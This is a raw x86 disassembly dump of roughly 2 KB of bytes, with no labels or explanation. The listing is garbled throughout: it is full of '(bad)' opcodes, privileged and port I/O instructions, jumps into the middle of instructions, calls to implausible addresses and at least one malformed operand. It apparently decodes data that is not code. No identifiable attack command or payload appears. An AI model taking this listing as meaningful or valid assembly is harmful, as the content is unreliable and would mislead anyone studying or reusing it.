  4103a7:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4103ac:	cmp    di,WORD PTR [ebp+0x0]
  4103b0:	mov    ebp,DWORD PTR [ebx]
  4103b2:	fdivr  QWORD PTR [esi+0x668a5d]
  4103b8:	cmp    al,0x33
  4103ba:	mov    si,0x4e7d
  4103be:	mov    eax,DWORD PTR [eax]
  4103c0:	lock inc ebp
  4103c2:	mov    esi,DWORD PTR [eax]
  4103c4:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4103cb:	clc    
  4103cc:	(bad)  
  4103cd:	cmp    edi,DWORD PTR [ebx]
  4103cf:	je     0x4103e0
  4103d1:	push   ebx
  4103d2:	loopne 0x4103e3
  4103d4:	dec    ecx
  4103d6:	mov    esp,DWORD PTR [ebp-0x1c]
  4103d9:	int    0xf1
  4103db:	mov    esi,0x703084d
  4103e0:	pcmpgtd mm6,mm1
  4103e3:	add    BYTE PTR [ebp+0x66],dh
  4103e6:	jmp    0x4103b3
  4103e8:	mov    eax,DWORD PTR [ebx]
  4103ea:	lock push ebp
  4103ec:	ror    DWORD PTR [ebp-0x2972feb3],1
  4103f2:	or     bh,dl
  4103f4:	jb     0x4103f4
  4103f6:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4103fc:	loopne 0x4103fe
  4103fe:	jne    0x410402
  410400:	data16 add BYTE PTR [esi+eiz*2],dh
  410404:	mov    ecx,ebx
  410406:	data16 cmp al,0xf1
  410409:	add    BYTE PTR [esi+eiz*2],bh
  41040c:	add    bl,cl
  41040e:	retw   0xf2
  410412:	ret    0x66
  410415:	retf   
  410416:	enterw 0x4df1,0x19
  41041b:	pop    edi
  41041c:	jne    0x41039f
  41041e:	mov    esi,DWORD PTR [eax]
  410420:	call   0x77b58fc1
  410425:	xor    ebp,DWORD PTR [ebx]
  410427:	lea    esp,[esi+0x48]
  41042a:	repnz in eax,0x3b
  41042d:	add    BYTE PTR [ebp-0x37],dh
  410430:	xor    edx,DWORD PTR [ebp-0x15]
  410433:	in     al,dx
  410434:	xor    edx,DWORD PTR [esi+0x40]
  410437:	mov    DWORD PTR [edi],0x338545fc
  41043d:	clc    
  41043e:	add    esi,DWORD PTR [ecx]
  410440:	pop    edi
  410441:	pushf  
  410442:	pop    ebx
  410443:	call   0xff42040a
  410448:	mov    edi,eax
  41044a:	push   ecx
  41044b:	pop    es
  41044c:	mov    edi,DWORD PTR [eax]
  41044e:	push   esi
  41044f:	inc    esi
  410450:	add    bh,BYTE PTR [esi+0x0]
  410453:	popa   
  410454:	data16 (bad) 
  410456:	into   
  410457:	gs cmp al,0xcd
  41045a:	add    BYTE PTR [ecx+0x7ce0866],bh
  410460:	ret    0x66
  410463:	add    bh,al
  410465:	add    bh,ah
  410467:	add    BYTE PTR [ebp+0x31c3f866],al
  41046d:	cmp    al,0x9c
  41046f:	add    BYTE PTR [esi+0x66],ah
  410472:	into   
  410473:	ret    
  410474:	pop    ebp
  410475:	adc    BYTE PTR [edi+0x0],dl
  410478:	mov    bh,0x66
  41047a:	mov    edi,0xff038dc3
  41047f:	jne    0x4104d5
  410481:	lea    edx,[ecx+0x1]
  410484:	mov    ebx,0xd64ff1
  410489:	sar    DWORD PTR [ebx],1
  41048b:	test   BYTE PTR [ebp+0x36],dh
  41048e:	mov    DWORD PTR [esp+edi*8-0x76],esp
  410492:	push   edi
  410493:	xor    BYTE PTR [ebx],0x38
  410496:	mov    esi,ebx
  410498:	xor    eax,DWORD PTR [eax-0x3c73819a]
  41049e:	ss inc ebp
  4104a0:	fs pop ebx
  4104a2:	mov    ebx,0x9c3b30
  4104a7:	je     0x4104d4
  4104a9:	xor    edi,DWORD PTR [ebx+0x668a33]
  4104af:	mov    WORD PTR [ebx],?
  4104b1:	ss mov ebx,0x8b4e64
  4104b7:	pop    edi
  4104b8:	cmp    ecx,ecx
  4104ba:	jne    0x410511
  4104bc:	mov    ebp,esp
  4104be:	cld    
  4104bf:	push   esi
  4104c0:	pop    ebx
  4104c1:	inc    ebp
  4104c2:	stc    
  4104c3:	xor    BYTE PTR [ebp+0x9bef89c],al
  4104c9:	test   esi,ecx
  4104cb:	clc    
  4104cc:	test   dl,dl
  4104ce:	cmp    bh,bh
  4104d0:	fs pop si
  4104d3:	or     bl,al
  4104d5:	add    cl,BYTE PTR [ebx+0x57665100]
  4104db:	retf   0x3c45
  4104de:	xor    BYTE PTR [eax],al
  4104e0:	pushf  
  4104e1:	mov    si,0x85ca
  4104e5:	ret    0xf8
  4104e8:	pop    ebx
  4104e9:	dec    dx
  4104ec:	mov    edx,DWORD PTR [edi-0x76]
  4104ef:	push   edi
  4104f0:	add    al,0xb7
  4104f2:	xor    al,0xba
  4104f4:	cmp    al,0x8d
  4104f6:	je     0x4104f7
  4104f8:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4104fc:	lea    edi,[ebx+0x544fff]
  410502:	push   ecx
  410503:	cmp    edx,DWORD PTR [ebx+0x75]
  410506:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41050c:	add    BYTE PTR [ebx],dh
  41050e:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410514:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  41051b:	mov    ebx,0x3b3b00
  410520:	jne    0x41054d
  410522:	mov    DWORD PTR [ebx+0x728afc],edi
  410528:	xor    esi,DWORD PTR [ebx]
  41052a:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410530:	push   edi
  410531:	cmp    esp,ebp
  410533:	jne    0x410535
  410535:	sbb    DWORD PTR [eax],0x8085c3fc
  41053b:	clc    
  41053c:	inc    esi
  41053d:	pop    ebx
  41053e:	sti    
  41053f:	add    eax,0xeb8bc075
  410544:	cld    
  410545:	xor    edi,DWORD PTR ds:0xf8c3855e
  41054b:	mov    ecx,DWORD PTR [ecx+edx*2]
  41054e:	rol    DWORD PTR [ebp-0x37],0xf
  410552:	mov    DWORD PTR [eax],ecx
  410554:	inc    edi
  410555:	(bad)  
  410556:	in     eax,0xfe
  410558:	add    bh,bh
  41055a:	(bad)  
  41055b:	mov    esi,0xc38a5e
  410560:	mov    esi,DWORD PTR [ebx]
  410562:	push   ecx
  410563:	mov    edi,0xfc4ec7
  410568:	test   DWORD PTR [ebp-0x8],edx
  41056b:	xor    di,ax
  41056e:	pushf  
  41056f:	sub    ebp,eax
  410571:	inc    ebp
  410572:	(bad)  
  410573:	sub    edi,edi
  410575:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  41057b:	inc    ebp
  41057c:	add    BYTE PTR [esi+0x2b],ah
  41057f:	or     bh,BYTE PTR [edx+0xf8ac2]
  410585:	cmp    al,0x33
  410587:	mov    edi,DWORD PTR [edx+0xfe4e81]
  41058d:	(bad)  
  41058e:	cmp    esi,DWORD PTR [ebx]
  410590:	je     0x41054a
  410592:	push   ebx
  410593:	dec    esi
  410594:	str    ecx
  410597:	cmp    esp,DWORD PTR [ebp+0x75]
  41059a:	int    0x33
  41059c:	mov    edi,0x789085f
  4105a1:	mov    edx,DWORD PTR [eax]
  4105a3:	cld    
  4105a4:	add    cl,cl
  4105a6:	data16 add al,0xcb
  4105a9:	push   ebp
  4105aa:	add    ebp,esp
  4105ac:	jne    0x41059a
  4105ae:	(bad)  
  4105af:	mov    DWORD PTR [ecx],0xd685f7ec
  4105b5:	clc    
  4105b6:	xlat   BYTE PTR ds:[ebx]
  4105b7:	inc    ebp
  4105b8:	mov    esi,DWORD PTR [edx]
  4105ba:	push   eax
  4105bb:	pushf  
  4105bc:	in     eax,0x8b
  4105be:	add    ah,ch
  4105c0:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4105c4:	add    ax,0x72cb
  4105c8:	cmp    al,0x0
  4105ca:	add    BYTE PTR [ebp+0x66],al
  4105cd:	(bad)  
  4105ce:	retf   
  4105cf:	lock ret 0x85
  4105d3:	clc    
  4105d4:	inc    bp
  4105d6:	retf   
  4105d7:	cmp    eax,0xc77d9cc8
  4105dc:	xor    ah,bh
  4105de:	pushf  
  4105df:	test   DWORD PTR [edi-0x8],ebx
  4105e2:	je     0x410629
  4105e4:	xor    esi,DWORD PTR ds:0x7020840
  4105ea:	ror    BYTE PTR [ebp-0x37],0x8d
  4105ee:	push   ebp
  4105ef:	add    esp,ebp
  4105f1:	jb     0x41057e
  4105f3:	add    BYTE PTR [eax],cl
  4105f5:	dec    ebp
  4105f6:	mov    bh,0x81
  4105f8:	push   esi
  4105f9:	push   esp
  4105fa:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  410601:	xor    al,BYTE PTR [eax]
  410603:	mov    edx,DWORD PTR [edi+0x10]
  410606:	(bad)  
  410607:	scas   eax,DWORD PTR es:[edi]
  410608:	ret    0x3b
  41060b:	jns    0x3b4202fe
  410611:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410615:	dec    ebp
  410616:	or     BYTE PTR [ebx],ch
  410618:	ret    0x458b
  41061b:	lock jmp 0x41060f
  41061e:	mov    ecx,DWORD PTR [eax]
  410620:	or     BYTE PTR [edi],al
  410622:	mov    ecx,eax
  410624:	xor    DWORD PTR [edx+0x2],0x0
  410628:	mov    bh,0xc1
  41062a:	adc    BYTE PTR [eax],dh
  41062c:	iret   
  41062d:	inc    ebp
  41062e:	mov    DWORD PTR [ebx],0x4dfff8c4
  410634:	inc    BYTE PTR [ebx]
  410636:	ret    0xf8
  410639:	adc    DWORD PTR [esi+0x10],esp
  41063c:	clc    
  41063d:	dec    ecx
  41063e:	fisttp WORD PTR [ecx+0x456604c0]
  410644:	add    dh,BYTE PTR ds:0x75e0845
  41064a:	ret    0x4d
  41064d:	lea    ecx,[ebx+0x18728301]
  410653:	add    BYTE PTR [ebp+0x45],al
  410656:	xor    ecx,ebp
  410658:	pushf  
  410659:	add    bh,al
  41065b:	add    al,ch
  41065d:	inc    ebp
  41065e:	test   DWORD PTR [ebx-0x3eba0708],ecx
  410664:	xor    eax,0x781084d
  410669:	push   esp
  41066a:	fwait
  41066b:	push   ecx
  41066c:	xor    al,BYTE PTR [ecx+0x32f89b89]
  410672:	inc    ebp
  410673:	cmp    edi,DWORD PTR [ecx]
  410675:	jbe    0x410613
  410677:	mov    eax,edi
  410679:	or     ah,dh
  41067b:	inc    ebp
  41067c:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  410682:	xor    ecx,DWORD PTR [ebx-0x74747664]
  410688:	in     al,dx
  410689:	hlt    
  41068a:	push   esp
  41068b:	push   esp
  41068c:	push   ecx
  41068d:	push   ecx
  41068e:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  410694:	fwait
  410695:	fwait
  410696:	xor    dh,BYTE PTR [edx]
  410698:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  41069e:	or     BYTE PTR [ebp+0x7],al
  4106a1:	mov    eax,ecx
  4106a3:	clc    
  4106a4:	jb     0x410667
  4106a6:	add    BYTE PTR [ebp+0x55],cl
  4106a9:	or     DWORD PTR [edi],0xc251d154
  4106af:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4106b9:	mov    edi,eax
  4106bb:	or     cl,al
  4106bd:	inc    ebp
  4106be:	dec    ebp
  4106bf:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4106c5:	or     WORD PTR [ecx],0x899b
  4106ca:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4106d0:	mov    edx,DWORD PTR [ecx+0x8]
  4106d3:	mov    eax,DWORD PTR [ebp-0x8]
  4106d6:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4106dd:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4106e3:	inc    ebp
  4106e4:	dec    eax
  4106e5:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4106eb:	add    edx,DWORD PTR [ecx-0x8]
  4106ee:	mov    ecx,DWORD PTR [ecx]
  4106f0:	clc    
  4106f1:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4106f8:	mov    ecx,ebp
  4106fa:	clc    
  4106fb:	(bad)  
  4106fc:	popf   
  4106fd:	inc    DWORD PTR [eax]
  4106ff:	ret    0x8b
  410702:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  410708:	mov    edi,esp
  41070a:	hlt    
  41070b:	test   ecx,esi
  41070d:	clc    
  41070e:	or     BYTE PTR [ebp+0x7],al
  410711:	xor    al,cl
  410713:	pushf  
  410714:	jb     0x410749
  410716:	add    BYTE PTR [eax-0x3f],al
  410719:	inc    eax
  41071a:	daa    
  41071b:	inc    ebp
  41071c:	inc    ebp
  41071d:	xor    eax,0x7f80803
  410722:	dec    ebp
  410723:	fwait
  410724:	add    esi,DWORD PTR [edx]
  410726:	clc    
  410727:	cmp    DWORD PTR [ecx],ecx
  410729:	or     al,0x8
  41072b:	add    al,BYTE PTR [ebp+0x2c]
  41072e:	xor    eax,0x7350845
  410733:	or     BYTE PTR [ebp+0x7],cl
  410736:	lea    ebx,[ebx-0x748dcdff]
  41073c:	add    BYTE PTR [eax*2-0x74b21438],cl
  410743:	mov    edx,DWORD PTR [eax]
  410745:	cld    
  410746:	dec    ebp
  410747:	push   esp
  410748:	sub    edx,DWORD PTR [ecx-0x75]
  41074b:	add    eax,0xf172fc
  410750:	or     BYTE PTR [ebp+0x7],cl
  410753:	add    eax,ecx
  410755:	or     al,0x72
  410757:	add    DWORD PTR [eax],eax
  410759:	mov    ebx,0x29c2c1
  41075e:	inc    ebp
  41075f:	mov    eax,DWORD PTR [ebx]
  410761:	cmp    eax,0x3004d1c
  410767:	xbegin 0x66c69361
  41076d:	clc    
  41076e:	or     BYTE PTR [ebp+0x45],al
  410771:	xor    dh,BYTE PTR ds:0x78b089c
  410777:	adc    BYTE PTR [ebp+0x45],cl
  41077a:	lea    eax,[ebp+0x33727501]
  410780:	add    cl,ch
  410782:	inc    ebp
  410783:	add    bl,ch
  410785:	add    BYTE PTR [ebx+0x45850845],cl
  41078b:	je     0x410718
  41078d:	push   ebx
  41078e:	or     al,0x85
  410790:	dec    ebp
  410791:	std    
  410792:	mov    bh,bh
  410794:	mov    BYTE PTR [ebp-0x75],al
  410797:	mov    edi,eax
  410799:	or     al,0x89
  41079b:	inc    ebp
  41079c:	clc    
  41079d:	mov    esp,esp
  41079f:	hlt    
  4107a0:	call   DWORD PTR [edi-0x37]
  4107a3:	push   esp
  4107a4:	or     al,0x51
  4107a6:	push   ebp
  4107a7:	xor    ebp,esp
  4107a9:	mov    esi,0x457251
  4107ae:	xor    esi,eax
  4107b0:	pushf  
  4107b1:	inc    ebp
  4107b2:	(bad)  
  4107b3:	mov    edi,eax
  4107b5:	or     al,0x85
  4107b7:	add    al,bh
  4107b9:	inc    eax
  4107bb:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4107bf:	or     ah,bh
  4107c1:	inc    eax
  4107c2:	push   esp
  4107c3:	jmp    0x410816
  4107c5:	mov    eax,DWORD PTR ds:0xe8720c
  4107cb:	mov    DWORD PTR [ebp-0x8],eax
  4107ce:	jne    0x410815
  4107d0:	jmp    0x41075d
  4107d2:	mov    ebp,DWORD PTR [eax]
  4107d4:	clc    
  4107d5:	retf   0xff54
  4107d8:	push   ecx
  4107d9:	mov    DWORD PTR ds:0x757210,eax
  4107df:	mov    ecx,DWORD PTR [ebp-0x4]
  4107e2:	sub    esp,DWORD PTR [ebx-0x77]
  4107e5:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4107ec:	or     ah,bh
  4107ee:	pop    es
  4107ef:	ds fwait
  4107f1:	push   DWORD PTR [edx]
  4107f3:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4107f9:	(bad)  
  4107fa:	mov    bh,bh
  4107fc:	jmp    0x4107ea
  4107fe:	leave  
  4107ff:	jne    0x410809
  410801:	call   0x2e015b
  410806:	in     al,dx
  410807:	dec    ebp
  410808:	add    dh,BYTE PTR [ebx]
  41080a:	add    BYTE PTR [ebx],al
  41080c:	inc    ebp
  41080d:	cmp    esi,DWORD PTR [ecx]
  41080f:	je     0x4107ad
  410811:	mov    eax,edi
  410813:	or     al,0xf0
  410815:	add    BYTE PTR [ebp+0x458bf845],al
  41081b:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410821:	adc    al,0x7
  410823:	enter  0x9fc0,0xa5
  410827:	rol    BYTE PTR [eax],0x5e
  41082a:	mov    ecx,ecx
  41082c:	or     al,0xc
  41082e:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410835:	jmp    0x410836
  410837:	push   ebp
  410838:	mov    esp,ebp
  41083a:	cld    
  41083b:	inc    ebp
  41083c:	inc    ebp
  41083d:	or     DWORD PTR [ecx+0x457dec10],0x0
  410844:	push   esi
  410845:	push   esi
  410846:	mov    edi,0x7af080f
  41084b:	add    bh,al
  41084d:	test   DWORD PTR [ebx+0x3a7320f],ebx
  410853:	add    BYTE PTR [ecx+0x4540100f],cl
  410859:	mov    ebp,eax
  41085b:	mov    ebp,edi
  41085d:	lock call edx
  410860:	fcom   DWORD PTR [ebp+0x45]
  410863:	mov    eax,0x148a8b
  410868:	push   ecx
  410869:	enter  0xc145,0x83
  41086d:	cmp    ecx,DWORD PTR [eax]
  41086f:	add    BYTE PTR [ebp+0x4d],al
  410872:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  410878:	call   0xffa103e7
  41087d:	cmp    eax,DWORD PTR [ebp-0xc]
  410880:	jmp    DWORD PTR [eax+edx*1-0x4e]
  410884:	push   ebp
  410885:	(bad)  
  410886:	call   0x32068a
  41088b:	mov    bh,0xdb
  41088d:	cld    
  41088e:	or     BYTE PTR [ebp+0x45],bl
  410891:	(bad)  
  410892:	call   0xff7b0522
  410897:	add    al,BYTE PTR [ebp+0x37]
  41089a:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  4108a0:	jne    0x4108a2
  4108a2:	(bad)  
  4108a3:	cmp    edi,esp
  4108a5:	jne    0x4108d8
  4108a7:	mov    edi,edi
  4108a9:	or     BYTE PTR [ebx-0x307f0b49],cl
  4108af:	pop    ds
  4108b0:	into   
  4108b1:	je     0x410874
  4108b3:	mov    ebx,DWORD PTR [esi]
  4108b5:	or     BYTE PTR [ebp-0x49],al
  4108b8:	mov    esp,DWORD PTR [esi-0x77]
  4108bb:	mov    esi,0x2451f0c
  4108c0:	mov    eax,DWORD PTR [eax]
  4108c2:	or     al,0x66
  4108c4:	sar    bl,0x3b
  4108c7:	xor    esi,DWORD PTR [ebp+0x66]
  4108ca:	xor    ecx,edi
  4108cc:	pop    edi
  4108cd:	adc    bl,BYTE PTR [ebx+0x7e]
  4108d0:	ret    0xff
  4108d3:	cld    
  4108d4:	inc    ebp
  4108d5:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4108db:	cld    
  4108dc:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4108e3:	push   0xffffff83
  4108e5:	pop    edi
  4108e6:	or     BYTE PTR [ebp+0x53],dh
  4108e9:	xorps  xmm1,xmm2
  4108ec:	test   BYTE PTR [eax+eax*1],bh
  4108ef:	add    BYTE PTR [eax],al
  4108f1:	adc    eax,eax
  4108f3:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4108fb:	jmp    DWORD PTR [eax]
  4108fd:	ror    al,0x5e
  410900:	inc    ebp
  410901:	leave  
  410902:	xor    ecx,DWORD PTR [eax]
  410904:	and    DWORD PTR [ebx-0x3ec30708],ecx
  41090a:	add    ah,al
  41090c:	xor    edi,edi
  41090e:	xor    DWORD PTR [ebx],0x66003302
  410914:	mov    DWORD PTR [ebp-0xc],ecx
  410917:	pcmpgtw mm0,mm0
  41091a:	add    dl,ah
  41091c:	leave  
  41091d:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  410921:	push   eax
  410922:	dec    ebp
  410923:	mov    esi,DWORD PTR [ebx-0x75]
  410926:	lea    ebp,[eax-0x7c00ff02]
  41092c:	xor    eax,DWORD PTR [eax]
  41092e:	sysret 
  410930:	dec    ebp
  410931:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410938:	push   WORD PTR [ecx+0x8]
  41093c:	jne    0x4108ff
  41093e:	ud0    ecx,DWORD PTR [ecx]
  410941:	mov    eax,edx
  410943:	lods   al,BYTE PTR ds:[esi]
  410944:	add    BYTE PTR [eax],al
  410946:	data16 (bad) 
  410948:	iret   
  410949:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410950:	cli    
  410951:	inc    ebp
  410952:	cmp    al,0x8d
  410954:	add    BYTE PTR [esi+0x2d],ah
  410957:	inc    ebp
  410958:	pop    ebp
  410959:	lea    ecx,[edi]
  41095b:	mov    dl,bh
  41095d:	add    BYTE PTR [edi],cl
  41095f:	mov    DWORD PTR [eax+eax*8],edi
  410962:	mov    ebx,0x3b87
  410967:	add    BYTE PTR [ebx],ch
  410969:	inc    ebp
  41096a:	data16 (bad) 
  41096c:	clc    
  41096d:	int3   
  41096e:	cmp    eax,DWORD PTR [eax]
  410970:	je     0x4108fb
  410972:	push   0xffffffc8
  410974:	pop    edi
  410975:	xchg   DWORD PTR [ebp+0x0],eax
  410978:	data16 add BYTE PTR [ebp+0x45],cl
  41097c:	lea    cx,[ebp+0x10]
  410980:	jb     0x410982
  410982:	jmp    0x41090d
  410984:	call   eax
  410986:	clc    
  410987:	xchg   DWORD PTR [edi+0x1],edi
  41098a:	mov    eax,DWORD PTR [eax]
  41098c:	or     BYTE PTR [ebp-0x49],al
  41098f:	lea    eax,[eax+0x74003154]
  410995:	push   edi
  410996:	inc    edx
  410997:	jge    0x410998
  410999:	mov    DWORD PTR [edi],ecx
  41099b:	fdiv   DWORD PTR [edi-0x6]
  41099e:	inc    DWORD PTR [eax]
  4109a0:	xor    edx,DWORD PTR [eax+0x5f]
  4109a3:	xchg   DWORD PTR [ebx+0x1],ebx
  4109a6:	ret    0x0
  4109a9:	xor    BYTE PTR [ebp-0x51],cl
  4109ac:	cmp    edi,0xf0ff89fe
  4109b2:	data16 ror al,0x84
  4109b6:	rol    BYTE PTR [eax],0x3b
  4109b9:	add    al,dh
  4109bb:	dec    eax
  4109bc:	xchg   esp,eax
  4109bd:	push   ebx
  4109be:	jmp    0x41094b
  4109c0:	push   ebp
  4109c1:	add    esp,ebp
  4109c3:	add    ebp,esp
  4109c5:	mov    edx,DWORD PTR [edi+0x24]
  4109c8:	clc    
  4109c9:	dec    esi
  4109ca:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  4109d0:	cmp    BYTE PTR [ebx],al
  4109d2:	jne    0x41095d
  4109d4:	xor    esp,eax
  4109d6:	jmp    0x440b59
  4109db:	add    ebp,DWORD PTR [ecx+ecx*4]
  4109de:	jne    0x4109d4
  4109e0:	call   0xffcb073a
  4109e5:	clc    
  4109e6:	xchg   edi,eax
  4109e7:	sti    
  4109e8:	add    DWORD PTR [ebx],eax
  4109ea:	add    BYTE PTR [ebp+0x47],bl
  4109ed:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  4109f3:	pop    ebp
  4109f4:	mov    DWORD PTR [esi-0x48],esi
  4109f7:	jmp    0x410a40
  4109f9:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  4109ff:	(bad)  
  410a01:	cmp    al,0x0
  410a03:	cmp    eax,DWORD PTR [ebp+0x18]
  410a06:	lea    ebx,[ebp-0x56]
  410a09:	jle    0x410a0b
  410a0b:	jae    0x410996
  410a0d:	mov    eax,esp
  410a0f:	call   0xb900:0x8b005587
  410a16:	inc    ebp
  410a17:	push   ebp
  410a18:	lea    ecx,[ebp-0x27ff4f12]
  410a1e:	mov    eax,edi
  410a20:	int3   
  410a21:	push   ebp
  410a22:	xchg   edi,eax
  410a24:	add    esp,ebp
  410a26:	add    BYTE PTR [eax],al
  410a28:	inc    ebp
  410a29:	add    BYTE PTR [ebp+0x8b3255],cl
  410a2f:	cld    
  410a30:	mov    DWORD PTR [edx],edi
  410a32:	aam    0x75
  410a34:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410a3a:	mov    DWORD PTR [ebx-0x50],edx
  410a3d:	test   BYTE PTR [ebp-0x1],0xe8
  410a41:	mov    eax,DWORD PTR [eax]
  410a43:	hlt    
  410a44:	add    al,al
  410a46:	mov    eax,DWORD PTR ds:0x890045a8
  410a4c:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410a52:	inc    DWORD PTR [eax*2+0xf75854d]
  410a59:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410a5f:	call   0x729767a0
  410a64:	je     0x410ac4
  410a66:	js     0x410ac7
  410a68:	lock ret 0x7e
  410a6c:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410a72:	mov    edi,edi
  410a74:	sbb    al,bl
  410a76:	clc    
  410a77:	add    BYTE PTR [ebp-0x73],bh
  410a7a:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410a80:	ror    BYTE PTR [eax],1
  410a82:	dec    ebp
  410a83:	xchg   ebp,eax
  410a84:	mov    edi,edi
  410a86:	in     al,0x8b
  410a88:	jge    0x410a13
  410a8a:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410a90:	clc    
  410a91:	pop    esi
  410a92:	fist   DWORD PTR [ebp+0x5d398b5d]
  410a98:	clc    
  410a99:	add    al,0x6e
  410a9b:	mov    eax,DWORD PTR [ebx]
  410a9d:	mov    BYTE PTR [ebp+0x0],dl
  410aa0:	mov    edx,DWORD PTR [ebx-0x20]
  410aa3:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  410aa9:	add    eax,0x3b3b73
  410aae:	adc    al,0x89
  410ab0:	pop    eax
  410ab1:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410ab5:	ret    0xf08
  410ab8:	cmp    al,0x2
  410aba:	mov    edx,eax
  410abc:	cld    
  410abd:	add    BYTE PTR [ebp+0x66],dl
  410ac0:	add    eax,ebx
  410ac2:	add    esp,eax
  410ac4:	sub    eax,eax
  410ac6:	or     BYTE PTR [ecx-0x77f474bb],cl
  410acc:	add    BYTE PTR [eax],al
  410ace:	mov    DWORD PTR [ebx-0x24],ebx
  410ad1:	push   edi
  410ad2:	push   ebp
  410ad3:	clc    
  410ad4:	add    DWORD PTR [esi+0x1b0100],0x45
  410adb:	out    0xff,eax
  410add:	add    edx,DWORD PTR [eax]
  410adf:	jmp    0x410ac9
  410ae1:	cmp    ch,0x46
  410ae4:	(bad)  
  410ae5:	jmp    0x40c69337
  410aea:	je     0x410a76
  410aec:	mov    eax,DWORD PTR [eax-0x10c78104]
  410af2:	inc    ebp
  410af3:	add    BYTE PTR [ebx-0x770375],al
  410af9:	add    ah,ch
  410afb:	add    edx,esp
  410afd:	pop    edi
  410afe:	pop    ebp
  410aff:	push   ebp
  410b00:	inc    ebx
  410b01:	in     al,dx
  410b02:	pop    ebp
  410b03:	in     al,dx
  410b04:	cmp    edx,DWORD PTR [edi-0x8]
  410b07:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  410b0e:	add    al,0x47
  410b10:	push   ebp
  410b11:	mov    esp,ebp
  410b13:	in     al,0x45
  410b15:	dec    ebp
  410b16:	push   esi
  410b17:	test   DWORD PTR [eax+0xfb010f],esi
  410b1d:	add    BYTE PTR [eax+0xc018b],dh
  410b23:	leave  
  410b24:	inc    ebp
  410b25:	test   al,ch
  410b27:	add    dh,bh
  410b29:	add    bh,bh
  410b2b:	dec    ebp
  410b2c:	push   cs
  410b2d:	mov    DWORD PTR [ecx],eax
  410b2f:	hlt    
  410b30:	push   es
  410b31:	dec    ebp
  410b32:	leave  
  410b33:	mov    DWORD PTR [eax],ecx
  410b35:	clc    
  410b36:	cmovge eax,ecx
  410b39:	mov    ecx,0x85c2f0
  410b3f:	clc    
  410b40:	pop    DWORD PTR [ebp+0x1]
  410b43:	push   ebx
  410b44:	add    BYTE PTR [ebp-0x15],bh
  410b47:	push   esi
  410b48:	xor    eax,0x898a45
  410b4d:	cld    
  410b4e:	add    al,BYTE PTR [ebp+0x0]
  410b51:	xor    esp,DWORD PTR [esi-0x64]
  410b54:	add    DWORD PTR [esi+0x78308c1],edi
  410b5a:	add    ah,BYTE PTR [ebp-0x49]
  410b5d:	int    0xbb
  410b5f:	mov    ecx,DWORD PTR [esi+0xc]
  410b62:	add    dh,al
  410b64:	cmp    ecx,ebx
  410b66:	jne    0x410b30
  410b68:	xor    ecx,DWORD PTR [ebp+0x66]
  410b6b:	jmp    0xc80b71
  410b70:	add    DWORD PTR [ebp+0x0],eax
  410b73:	mov    eax,ebx
  410b75:	or     al,0x8b
  410b77:	(bad)  
  410b78:	mov    ecx,esi
  410b7a:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  410b81:	mov    eax,edi
  410b83:	or     BYTE PTR [edx],cl
  410b85:	shl    cl,cl
  410b87:	icebp  
  410b88:	add    BYTE PTR [ebp+0x38],0x8b
  410b8c:	or     BYTE PTR [edx+eax*2],cl
  410b8f:	(bad)  
  410b90:	or     cl,dh
  410b92:	stc    
  410b93:	shl    DWORD PTR [ebp-0x30],0xc6
  410b97:	xor    al,0x0
  410b99:	inc    ebp
  410b9a:	xchg   BYTE PTR [ebx],al
  410b9c:	add    esp,edi
  410b9e:	add    BYTE PTR [ebp-0x39],cl
  410ba1:	mov    al,bl
  410ba3:	test   DWORD PTR [ebx+0x1c348375],ecx
  410ba9:	sub    al,0xbf
  410bab:	jmp    0x410b32
  410bad:	mov    edi,eax
  410baf:	lock jge 0x410ba3
  410bb2:	lea    esi,[edx-0x74bad5ff]
  410bb8:	mov    ebp,esp
  410bba:	or     cl,dh
  410bbc:	leave  
  410bbd:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  410bc4:	dec    ebp
  410bc5:	dec    ebp
  410bc6:	test   DWORD PTR [ebx],eax
